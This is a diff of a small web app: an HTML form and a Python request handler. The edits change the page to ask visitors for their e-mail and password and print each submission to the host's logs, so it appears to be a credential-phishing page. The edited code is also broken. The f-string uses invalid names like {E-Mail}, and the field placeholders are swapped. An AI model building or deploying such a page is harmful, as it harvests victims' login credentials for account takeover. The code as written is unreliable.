@@ -239,7 +239,7 @@ h1{
       <circle cx="72" cy="46" r="4.5" fill="#16191C"/>
     </svg>
     <h1>Buraya Koy+</h1>
-    <p class="subtitle">send your E-Mail/password</p>
+    <p class="subtitle">send your E-Mail/Passwort</p>
   </header>
 
   <section class="sheet" id="sheet">
@@ -247,14 +247,14 @@ h1{
 
     <form id="form" autocomplete="off" novalidate>
       <div class="field">
-        <label for="user">Username</label>
-        <input id="user" name="user" placeholder="Username" maxlength="60"
+        <label for="user">E-Mail</label>
+        <input id="user" name="user" placeholder="Passwort" maxlength="60"
                autocapitalize="none" autocorrect="off" spellcheck="false">
       </div>
 
       <div class="field">
         <label for="word">Message <span id="count">0/300</span></label>
-        <textarea id="word" name="word" placeholder="message" maxlength="300"></textarea>
+        <textarea id="word" name="word" placeholder="E-Mail" maxlength="300"></textarea>
       </div>
 
       <button class="btn" id="send" type="submit" disabled>
@@ -390,7 +390,7 @@ class Handler(BaseHTTPRequestHandler):
         message = info.get("word", [""])[0][:300]
 
         # Erscheint im Render-Tab "Logs"
-        print(f"NEW MESSAGE -> {E-Mail}: {password}", flush=True)
+        print(f"NEW MESSAGE -> {E-Mail}: {Passwort}", flush=True)
 
         self._send(200, b"OK")
 
